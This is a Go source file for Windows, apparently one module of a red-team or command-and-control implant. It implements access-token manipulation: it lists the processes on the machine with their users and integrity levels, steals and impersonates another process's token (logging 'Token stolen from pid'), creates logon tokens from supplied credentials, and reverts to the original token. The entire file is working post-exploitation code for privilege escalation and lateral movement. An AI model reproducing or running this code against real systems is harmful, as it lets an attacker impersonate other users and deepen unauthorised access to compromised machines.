//go:build windows
// +build windows

package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

var (
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	procOpenProcessToken          = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx          = advapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser   = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf              = advapi32.NewProc("RevertToSelf")
	procGetTokenInformation       = advapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW         = advapi32.NewProc("LookupAccountSidW")
	procLogonUserW                = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUserFn = advapi32.NewProc("ImpersonateLoggedOnUser")
)

const (
	TOKEN_DUPLICATE           = 0x0002
	TOKEN_IMPERSONATE         = 0x0004
	TOKEN_QUERY               = 0x0008
	TOKEN_ALL_ACCESS_TOKEN    = 0xF01FF
	TokenUser                 = 1
	TokenIntegrityLevel       = 25
	TokenType_Token           = 8
	SecurityImpersonation     = 2
	TokenImpersonation        = 2
	TokenPrimary              = 1
	LOGON32_LOGON_INTERACTIVE = 2
	LOGON32_LOGON_NETWORK     = 3
	LOGON32_PROVIDER_DEFAULT  = 0
)

type tokenInfoResult struct {
	PID         uint32
	ProcessName string
	Domain      string
	Username    string
	Integrity   string
	TokenType   string
	Error       string
}

func getCurrentTokenUser() string {
	var hToken uintptr
	currentThread, _, _ := k32.NewProc("GetCurrentThread").Call()
	advapi32.NewProc("OpenThreadToken").Call(currentThread, TOKEN_QUERY, 1, uintptr(unsafe.Pointer(&hToken)))
	if hToken == 0 {
		currentProcess, _, _ := k32.NewProc("GetCurrentProcess").Call()
		procOpenProcessToken.Call(currentProcess, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	}
	if hToken == 0 {
		return "(unknown)"
	}
	defer procCloseHandle.Call(hToken)
	return getTokenUsername(hToken)
}

func getTokenUsername(hToken uintptr) string {
	var needed uint32
	procGetTokenInformation.Call(hToken, TokenUser, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return "(unknown)"
	}
	buf := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(hToken, TokenUser, uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if ret == 0 {
		return "(query failed)"
	}
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "(null sid)"
	}

	var nameLen, domLen uint32 = 256, 256
	name := make([]uint16, nameLen)
	dom := make([]uint16, domLen)
	var sidUse uint32
	ret, _, _ = procLookupAccountSidW.Call(
		0, sidPtr,
		uintptr(unsafe.Pointer(&name[0])),
		uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&dom[0])),
		uintptr(unsafe.Pointer(&domLen)),
		uintptr(unsafe.Pointer(&sidUse)),
	)
	if ret == 0 {
		return "(lookup failed)"
	}
	return syscall.UTF16ToString(dom[:domLen]) + "\\" + syscall.UTF16ToString(name[:nameLen])
}

func getTokenIntegrity(hToken uintptr) string {
	var needed uint32
	procGetTokenInformation.Call(hToken, TokenIntegrityLevel, 0, 0, uintptr(unsafe.Pointer(&needed)))
	if needed == 0 {
		return "unknown"
	}
	buf := make([]byte, needed)
	ret, _, _ := procGetTokenInformation.Call(hToken, TokenIntegrityLevel, uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if ret == 0 {
		return "unknown"
	}
	sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
	if sidPtr == 0 {
		return "unknown"
	}
	subCount := *(*byte)(unsafe.Pointer(sidPtr + 1))
	if subCount == 0 {
		return "unknown"
	}
	ridOffset := uintptr(8) + uintptr(subCount-1)*4
	rid := *(*uint32)(unsafe.Pointer(sidPtr + ridOffset))
	switch {
	case rid < 0x2000:
		return "Untrusted"
	case rid < 0x3000:
		return "Low"
	case rid < 0x4000:
		return "Medium"
	case rid < 0x5000:
		return "Medium+"
	case rid < 0x6000:
		return "High"
	default:
		return "System"
	}
}

func tokenListProcesses() ([]tokenInfoResult, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32First failed")
	}

	var results []tokenInfoResult
	for ret != 0 {
		pid := entry.th32ProcessID
		procName := syscall.UTF16ToString(entry.szExeFile[:])

		res := tokenInfoResult{
			PID:         pid,
			ProcessName: procName,
		}

		hProc, _, _ := procOpenProcess.Call(
			uintptr(PROCESS_QUERY_INFORMATION),
			0,
			uintptr(pid),
		)
		if hProc != 0 {
			var hToken uintptr
			tokRet, _, _ := procOpenProcessToken.Call(hProc, TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
			if tokRet != 0 && hToken != 0 {
				res.Username = getTokenUsername(hToken)
				res.Integrity = getTokenIntegrity(hToken)
				procCloseHandle.Call(hToken)
			} else {
				res.Error = "token_access_denied"
			}
			procCloseHandle.Call(hProc)
		} else {
			res.Error = "process_access_denied"
		}

		results = append(results, res)
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
	}
	return results, nil
}

func tokenSteal(pid uint32) (domain, username, integrity string, err error) {
	hProc, _, _ := procOpenProcess.Call(
		uintptr(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ),
		0,
		uintptr(pid),
	)
	if hProc == 0 {
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return "", "", "", fmt.Errorf("OpenProcess pid=%d failed (check privileges)", pid)
	}
	defer procCloseHandle.Call(hProc)

	var hToken uintptr
	ret, _, le := procOpenProcessToken.Call(hProc, TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_IMPERSONATE, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return "", "", "", fmt.Errorf("OpenProcessToken failed: %v", le)
	}
	defer procCloseHandle.Call(hToken)

	integrity = getTokenIntegrity(hToken)

	var hDup uintptr
	ret, _, le = procDuplicateTokenEx.Call(
		hToken,
		uintptr(TOKEN_ALL_ACCESS_TOKEN),
		0,
		uintptr(SecurityImpersonation),
		uintptr(TokenImpersonation),
		uintptr(unsafe.Pointer(&hDup)),
	)
	if ret == 0 {
		return "", "", "", fmt.Errorf("DuplicateTokenEx failed: %v", le)
	}

	user := getTokenUsername(hDup)
	parts := strings.SplitN(user, "\\", 2)
	if len(parts) == 2 {
		domain = parts[0]
		username = parts[1]
	} else {
		username = user
	}

	ret, _, le = procImpersonateLoggedOnUser.Call(hDup)
	procCloseHandle.Call(hDup)
	if ret == 0 {
		return domain, username, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
	}

	debugLog(fmt.Sprintf("Token stolen from pid %d: %s\\%s (%s)", pid, domain, username, integrity))
	return domain, username, integrity, nil
}

func tokenMake(domainUser, password, logonTypeStr string) (domain, username, integrity string, err error) {
	var dom, user string
	if strings.Contains(domainUser, "\\") {
		parts := strings.SplitN(domainUser, "\\", 2)
		dom = parts[0]
		user = parts[1]
	} else if strings.Contains(domainUser, "@") {
		parts := strings.SplitN(domainUser, "@", 2)
		user = parts[0]
		dom = parts[1]
	} else {
		user = domainUser
		dom = "."
	}

	logonType := uint32(LOGON32_LOGON_INTERACTIVE)
	switch strings.ToLower(strings.TrimSpace(logonTypeStr)) {
	case "network", "3":
		logonType = LOGON32_LOGON_NETWORK
	case "interactive", "2", "":
		logonType = LOGON32_LOGON_INTERACTIVE
	}

	userPtr, _ := syscall.UTF16PtrFromString(user)
	domPtr, _ := syscall.UTF16PtrFromString(dom)
	passPtr, _ := syscall.UTF16PtrFromString(password)

	var hToken uintptr
	ret, _, le := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		uintptr(logonType),
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return "", "", "", fmt.Errorf("LogonUser failed for %s\\%s: %v", dom, user, le)
	}

	integrity = getTokenIntegrity(hToken)

	ret, _, le = procImpersonateLoggedOnUser.Call(hToken)
	procCloseHandle.Call(hToken)
	if ret == 0 {
		return dom, user, integrity, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", le)
	}

	debugLog(fmt.Sprintf("Token made for %s\\%s (%s)", dom, user, integrity))
	return dom, user, integrity, nil
}

func tokenRevert() error {
	ret, _, le := procRevertToSelf.Call()
	if ret == 0 {
		return fmt.Errorf("RevertToSelf failed: %v", le)
	}
	debugLog("RevertToSelf: back to process token")
	return nil
}
